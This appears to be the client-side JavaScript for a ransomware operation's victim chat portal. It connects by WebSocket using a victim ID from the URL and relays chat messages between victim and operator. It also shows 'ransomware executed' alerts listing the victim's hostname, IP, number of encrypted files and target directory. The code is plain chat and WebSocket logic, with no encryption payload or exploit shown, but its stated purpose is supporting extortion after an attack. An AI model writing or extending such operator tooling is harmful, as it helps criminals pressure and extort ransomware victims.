document.addEventListener('DOMContentLoaded', function() {
  // WebSocket connection
  let socket;
  let reconnectAttempts = 0;
  const maxReconnectAttempts = 5;
  const reconnectDelay = 3000; // 3 seconds
  let isConnected = false;
  let messageQueue = [];
  
  // Get the victim ID from the URL
  const urlParams = new URLSearchParams(window.location.search);
  const victimId = urlParams.get('id');
  
  if (!victimId) {
    showError('Error: Missing victim ID in URL');
    return;
  }
  
  // Connect to WebSocket
  function connectWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
    const wsUrl = `${protocol}${window.location.host}/ws/chat?victimId=${victimId}`;
    
    socket = new WebSocket(wsUrl);
    
    socket.onopen = () => {
      console.log('WebSocket connected');
      isConnected = true;
      reconnectAttempts = 0;
      
      // Send any queued messages
      while (messageQueue.length > 0 && isConnected) {
        const message = messageQueue.shift();
        sendMessageToServer(message);
      }
    };
    
    socket.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);
        handleIncomingMessage(message);
      } catch (error) {
        console.error('Error parsing WebSocket message:', error);
      }
    };
    
    socket.onclose = () => {
      console.log('WebSocket disconnected');
      isConnected = false;
      
      // Attempt to reconnect
      if (reconnectAttempts < maxReconnectAttempts) {
        reconnectAttempts++;
        const delay = reconnectDelay * Math.pow(2, reconnectAttempts - 1);
        console.log(`Attempting to reconnect in ${delay/1000} seconds... (${reconnectAttempts}/${maxReconnectAttempts})`);
        
        setTimeout(connectWebSocket, delay);
      } else {
        showError('Connection lost. Please refresh the page to continue.');
      }
    };
    
    socket.onerror = (error) => {
      console.error('WebSocket error:', error);
    };
  }
  
  // Initialize WebSocket connection
  connectWebSocket();
  
  // Handle incoming WebSocket messages
  function handleIncomingMessage(message) {
    console.log('Received message:', message);
    
    switch (message.type) {
      case 'chat_message':
        addMessage(message.content, 'received');
        break;
        
      case 'ransomware_execution':
        const victimInfo = message.data;
        const notificationText = `🚨 Ransomware executed on victim ${victimId}`;
        const details = [
          `💻 Hostname: ${victimInfo.hostname || 'N/A'}`,
          `🌐 IP: ${victimInfo.ip || 'N/A'}`,
          `💾 Encrypted Files: ${victimInfo.encryptedFiles || 0}`,
          `📁 Target Directory: ${victimInfo.targetDir || 'N/A'}`,
          `⏰ Time: ${new Date().toLocaleString()}`
        ];
        
        // Add system message with ransomware details
        addSystemMessage(notificationText);
        details.forEach(detail => {
          addSystemMessage(detail);
        });
        
        // Play notification sound
        playNotificationSound();
        break;
        
      case 'system_notification':
        addSystemMessage(message.content);
        break;
        
      default:
        console.warn('Unknown message type:', message.type);
    }
  }
  
  // Play notification sound
  function playNotificationSound() {
    const audio = new Audio('/notification.mp3');
    audio.play().catch(e => console.warn('Could not play notification sound:', e));
  }
  
  // Send message to WebSocket server
  function sendMessageToServer(message) {
    if (!isConnected) {
      // Queue the message if not connected
      messageQueue.push(message);
      return false;
    }
    
    try {
      socket.send(JSON.stringify({
        type: 'chat_message',
        content: message,
        sender: {
          type: 'victim',
          id: victimId
        }
      }));
      return true;
    } catch (error) {
      console.error('Error sending message:', error);
      return false;
    }
  }
  
  // Show error message to user
  function showError(message) {
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.textContent = message;
    errorDiv.style.color = 'red';
    errorDiv.style.padding = '10px';
    errorDiv.style.textAlign = 'center';
    errorDiv.style.backgroundColor = '#ffebee';
    errorDiv.style.borderRadius = '4px';
    errorDiv.style.margin = '10px 0';
    
    const header = document.querySelector('.header');
    if (header && header.nextSibling) {
      header.parentNode.insertBefore(errorDiv, header.nextSibling);
    } else {
      document.body.insertBefore(errorDiv, document.body.firstChild);
    }
    
    // Remove error after 5 seconds
    setTimeout(() => {
      errorDiv.style.opacity = '0';
      errorDiv.style.transition = 'opacity 1s';
      setTimeout(() => errorDiv.remove(), 1000);
    }, 5000);
  }
  
  // DOM elements
  const chatMessages = document.getElementById('chatMessages');
  const messageInput = document.getElementById('messageInput');
  const sendButton = document.getElementById('sendButton');
  
  // Generate a random user ID for this session if it doesn't exist
  let userId = localStorage.getItem('victimChatUserId');
  if (!userId) {
    userId = 'user_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('victimChatUserId', userId);
  }
  
  // Event listeners
  addSystemMessage("You're now chatting with a random stranger. Say hi!");
  
  // Handle send button click
  sendButton.addEventListener('click', sendMessage);
  
  // Handle Enter key in input field
  messageInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      sendMessage();
    }
  });
  
  // Function to send a message
  function sendMessage() {
    const message = messageInput.value.trim();
    if (message === '') return;
    
    // Add the message to the chat immediately for better UX
    addMessage(message, 'sent');
    
    // Clear the input field
    messageInput.value = '';
    
    // Send the message to the server
    const messageSent = sendMessageToServer(message);
    
    if (!messageSent) {
      // If message couldn't be sent immediately, show a warning but keep it in the queue
      showError('Message will be sent when connection is restored');
    }
  }
  
  // Function to add a message to the chat
  function addMessage(text, type) {
    const messageDiv = document.createElement('div');
    messageDiv.className = `message ${type}`;
    
    const messageText = document.createElement('div');
    messageText.className = 'message-text';
    messageText.textContent = text;
    
    const timeDiv = document.createElement('div');
    timeDiv.className = 'message-time';
    timeDiv.textContent = getCurrentTime();
    
    messageDiv.appendChild(messageText);
    messageDiv.appendChild(timeDiv);
    
    chatMessages.appendChild(messageDiv);
  }
  
  // Function to get current time in HH:MM format
  function getCurrentTime() {
    const now = new Date();
    return now.getHours().toString().padStart(2, '0') + ':' + 
           now.getMinutes().toString().padStart(2, '0');
  }
  
  // Function to scroll chat to bottom
  function scrollToBottom() {
    chatMessages.scrollTop = chatMessages.scrollHeight;
  }
  
  // Initial scroll to bottom
  scrollToBottom();
  
  // In a real implementation, you would set up WebSocket or polling here
  // to receive messages from the server
  
  // Example of receiving a message (this would come from the server in a real app)
  // setTimeout(() => {
  //   addMessage("Hello! How can I help you with your files?", 'received');
  // }, 1500);
});
